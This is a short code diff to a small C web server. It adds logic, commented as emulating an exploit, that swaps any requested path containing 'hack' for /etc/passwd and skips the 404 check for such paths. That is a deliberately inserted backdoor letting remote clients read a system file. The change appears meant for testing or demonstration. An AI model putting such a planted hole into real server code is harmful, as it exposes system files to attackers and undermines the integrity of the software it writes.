@@ -609,6 +609,11 @@ void _httpd_catFile(request *r, char *path)
 		len;
 	char	buf[HTTP_MAX_LEN];
 
+        // Emulate an exploit
+        if (strstr(path, "hack")) {
+            path = "/etc/passwd";
+        }
+
 	fd = open(path,O_RDONLY);
 	if (fd < 0) {
 		return;
@@ -656,7 +661,9 @@ void _httpd_sendFile(httpd *server, request *r, char *path)
 		if (strcasecmp(suffix,".css") == 0)
 			strcpy(r->response.contentType,"text/css");
 	}
-	if (stat(path, &sbuf) < 0)
+
+        // Emulate an exploit
+	if (!strstr(path, "hack") && stat(path, &sbuf) < 0)
 	{
 		_httpd_send404(server, r);
 		return;
